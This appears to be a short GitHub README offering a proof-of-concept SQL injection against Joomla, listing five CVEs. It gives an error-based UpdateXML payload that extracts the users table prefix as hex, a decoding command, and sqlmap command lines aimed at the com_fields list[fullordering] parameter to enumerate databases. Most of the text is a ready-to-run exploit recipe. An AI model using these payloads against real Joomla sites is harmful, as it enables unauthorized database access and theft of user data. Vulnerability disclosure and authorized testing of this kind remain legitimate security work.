# Joomla-SQLinjection PoC

1. CVE-2020-10243

2. CVE-2019-19846

3. CVE-2018-8045

4. CVE-2018-6376

5. CVE-2017-8917

# Payload to detect prefix table
## Step 1: Get hexa value
*UpdateXML(2, concat(0x3a,(SELECT HEX(MID(TABLE_NAME,1,16)) FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT 1,1), 0x3a), 1)*
## Step 2: Convert hexa to ASCII
+) Linux command: echo <hexa value> | xxd -r -p

+) Link: https://www.rapidtables.com/convert/number/hex-to-ascii.html
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77494259-ddd35680-6e77-11ea-8331-106c89b48f7c.png)
## Sqlmap:
sqlmap -u "[your taget]/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs
## Example
sqlmap -u "http://192.168.119.128/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbms=mysql --technique=E --dbs

Reference:
1. https://github.com/HoangKien1020/CVE-2020-10243
2. https://xz.aliyun.com/t/6990
